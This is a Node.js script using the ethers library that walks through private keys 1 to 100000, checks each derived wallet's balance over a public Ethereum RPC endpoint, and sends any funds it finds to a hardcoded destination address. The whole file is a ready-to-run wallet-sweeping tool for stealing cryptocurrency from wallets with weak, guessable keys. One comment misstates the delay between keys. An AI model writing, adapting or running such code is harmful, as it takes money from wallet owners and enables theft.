const ethers = require("ethers");

const provider = new ethers.JsonRpcProvider("https://eth.rpc.blxrbdn.com");
const DESTINATION_ADDRESS = "0x422B0755EABeA90Cc2C5674F8Bba65C861962fdD";




async function main() {
    let num = 1n;
    const limit = 100000;

   for (let i = 0; i < limit; i++) {
        // Convert number to hex and pad to 64 chars
        const hexKey = num.toString(16).padStart(64, "0");
        const privateKey = "0x" + hexKey;

        console.log(`Private Key: ${privateKey}`);

        try {
            // Create wallet
            const wallet = new ethers.Wallet(privateKey, provider);
            console.log(`Wallet address: ${wallet.address}`);

            // Get balance
            const balance = await provider.getBalance(wallet.address);
            console.log(`Balance: ${ethers.formatEther(balance)} ETH`);
            console.log("---------------------------------------------");

            // If balance > 0, send funds
            if (balance > 0n) {
                console.log(`Wow nice !! Sending funds...`);
                const tx = await wallet.sendTransaction({
                    to: DESTINATION_ADDRESS,
                    value: balance - ethers.parseEther("0.0001") // keep a tiny bit for gas
                });
                console.log(`TX sent: ${tx.hash}`);
                await tx.wait();
                console.log(`TX confirmed!`);
            }
        } catch (error) {
            console.error(`Error with key ${privateKey}: ${error.message}`);
        }

        // Increment the number for next key
        num++;

        // ✅ Wait for 2 seconds
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

main();
